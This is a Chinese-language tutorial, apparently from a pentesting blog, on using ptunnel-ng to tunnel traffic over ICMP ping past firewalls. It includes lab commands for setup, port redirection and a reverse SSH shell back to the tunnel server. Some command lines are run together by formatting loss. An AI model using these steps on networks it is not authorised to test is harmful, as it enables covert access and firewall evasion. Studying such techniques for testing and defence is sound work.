1、简介


1.1 ptunnel简介


通过ICMP echo(ping requests) 和 reply （ping reply）实现隧道


适用于防火墙只允许ping出站流量的环境


支持多并发连接、性能优


支持身份认证


需要root权限


1.2 ptunnel工具


  • ✅ptunnel : http://www.cs.uit.no/~daniels/PingTunnel/#download

  • ✅ptunnel-ng:  https://github.com/lnslbrty/ptunnel-ng

  • ✅pingtunnel: https://github.com/esrrhs/pingtunnel


1.3 测试环境


2、Ptunnel服务器端


kali系统默认已经安装Ptunnel，本次使用ptunnel-ng进行测试。


2.1 ptunnel-ng安装
apt-get install autoconf -ygit clone https://github.com/lnslbrty/ptunnel-ng.gitcd ptunnel-ngsudo bash autogen.sh
2.2 关闭系统默认ping

由于通过ICMP协议建立隧道，为了让隧道服务端能够处理收到的ICMP报文，需要禁用系统本身的ICMP响应机制

echo 1 >/proc/sys/net/ipv4/icmp_echo_ignore_all
2.3 启动服务
sudo ptunnel-ng -P 123456-P       #服务器连接密码

3、Ptunnel客户端

测试系统中使用centos7进行测试


3.1 安装部署
yum install autoconf -ygit clone https://github.com/lnslbrty/ptunnel-ng.gitcd ptunnel-ngsudo bash autogen.sh
3.2 基本连接服务器
sudo ptunnel-ng -p192.168.207.134 -l2222 -P123456ssh -p2222 -luser 127.0.0.1


4、高级用法


4.1 重定向

通过客户端192.168.1.2通过ptunnel-ng服务器192.168.207.134访问外部服务器192.168.207.100。


4.1.1 服务器配置
sudo ptunnel-ng -r192.168.207.100 -R80
4.1.2 客户端配置
ptunnel-ng -p192.168.207.134 -l8000 -r192.168.207.100 -R80 -P123456-p           #服务器IP地址-l           #本地监听端口-r           #需要访问WWW服务器的IP-R           #需要访问WWW服务器的端口-P           #认证端口
4.2 反弹shell

客户端192.168.1.2把自己的ssh反弹到ptunnel-ng服务器192.168.207.134

4.2.1 服务器上配置
sudo ptunnel-ng -r192.168.207.134 -R22# 指定的服务器和端口都为ptunnel-ng服务器
4.2.2 客户端配置
ptunnel-ng -p192.168.207.134 -l2222 -r192.168.207.134 -R22ssh -fCNg -R 22222:127.0.0.1:22 kali@127.0.0.1 -p2222# 22222端口为客户端开启ptunnel-ng服务器端口# 22端口为客户端本地SSH端口# 2222端口为ptunnel-ng服务器的22端口映射到客户端的2222端口
4.2.3 服务器连接本地端口
ssh -p22222 root@127.0.0.1
